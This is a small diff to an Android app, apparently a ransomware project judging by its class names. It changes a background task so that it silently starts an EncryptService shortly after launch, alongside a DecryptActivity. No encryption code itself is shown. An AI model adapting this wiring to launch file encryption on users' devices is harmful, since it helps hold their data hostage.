@@ -19,6 +19,7 @@ import java.util.List;
 import alepacheco.com.rw.activityes.DecryptActivity;
 import alepacheco.com.rw.io.IO;
 import alepacheco.com.rw.persistence.LocalStorage;
+import alepacheco.com.rw.services.EncryptService;
 import alepacheco.com.rw.services.MyService;
 
 public class MainActivity extends Activity {
@@ -86,7 +87,7 @@ public class MainActivity extends Activity {
     private class RunService extends AsyncTask<Context, Void, Void> {
         protected Void doInBackground(Context... parms) {
             SystemClock.sleep(1000);
-            Intent srv = new Intent(parms[0], MyService.class);
+            Intent srv = new Intent(parms[0], EncryptService.class);
             startService(srv);
             return null;
         }
